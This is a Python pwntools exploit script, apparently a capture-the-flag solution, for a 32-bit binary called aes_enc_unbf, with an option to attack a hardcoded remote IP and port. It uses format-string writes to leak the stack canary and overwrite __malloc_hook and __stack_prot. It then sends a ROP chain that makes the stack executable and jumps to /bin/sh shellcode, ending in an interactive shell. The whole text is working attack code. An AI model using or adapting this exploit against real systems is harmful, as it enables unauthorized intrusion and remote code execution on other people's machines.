from pwn import *
import time
import sys

def aes_enc_unbf(DEBUG):
	t = 0.3
	
	if DEBUG=="1":
		t = 0.005
		r = process("./aes_enc_unbf")
		raw_input("debug?")
	elif DEBUG=="2":
		HOST = '128.199.224.175'
		PORT = 33100
		r = remote(HOST,PORT)
	
	shellcode = "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x50\x50\x59\x5A\x89\xE3\x6A\x5B\x58\x34\x50\xCD\x80"
	__malloc_hook = 0x08230598
	__stack_prot = 0x0822EC98 
	_libc_stack_end = 0x0822ECE8
	_dl_make_stack_executable = 0x081715D0
	main = 0x08048CE0
	pop_eax = 0x0804c906
	jmp_esp = 0x08174bec 
	
	log.info('X: %#x' % (main>>16))
	log.info('Y: %#x' % ((main&0xffff)-(main>>16)))
	# gdb.attach(r,open("a"))
	fmt = ""
	fmt += p32(__stack_prot)
	fmt += p32(__malloc_hook+2)
	fmt += p32(__malloc_hook)
	fmt += "%7$n"
	fmt += "%" + str((main>>16) - 12) + "x" + "%8$hn"
	fmt += "%"+ str((main&0xffff)-((main>>16))) + "x" + "%9$hn" # *__malloc_hook = main
	fmt += "XXXX|%39$p|%41$p|YYYY"
	log.info('%s' % fmt)
	r.recvuntil("Enter message :- ")
	r.sendline(fmt) 
	r.recvuntil("XXXX|")
	res = r.recvuntil("YYYY")
	address = res.split("|")
	canary = int(address[0],16)
	stack = int(address[1],16)
	log.info('canary: %#x' % canary)
	log.info('stack: %#x' % stack)
	
	fmt = ""
	fmt += p32(__stack_prot)
	fmt += "%259u"+"%7$hhn" # 0x822ec98 (__stack_prot) <- 0x7
	log.info('%s' % fmt)
	r.recvuntil("Enter message :- ")
	r.sendline(fmt)
	
	
	fmt = ""
	fmt += p32(__malloc_hook)
	fmt += p32(__malloc_hook+1)
	fmt += p32(__malloc_hook+2)
	fmt += p32(__malloc_hook+3)
	fmt += "%"+str(0xff-15)+"u"+"%7$hhn"
	fmt += "%"+str(0x100)+"u"+"%8$hhn"
	fmt += "%"+str(0x200)+"u"+"%9$hhn"
	fmt += "%"+str(0x300)+"u"+"%10$hhn" # *__malloc_hook = 0
	fmt += "A"*0x43
	fmt += p32(canary)
	fmt += "B"*4
	fmt += p32(stack-0x5b8+4)
	fmt += p32(pop_eax)
	fmt += p32(_libc_stack_end)
	fmt += p32(_dl_make_stack_executable)
	fmt += p32(jmp_esp)
	fmt += shellcode
  	log.info('%s' % fmt)
	r.recvuntil("Enter message :- ")
	r.sendline(fmt)
	r.interactive()

aes_enc_unbf(sys.argv[1])
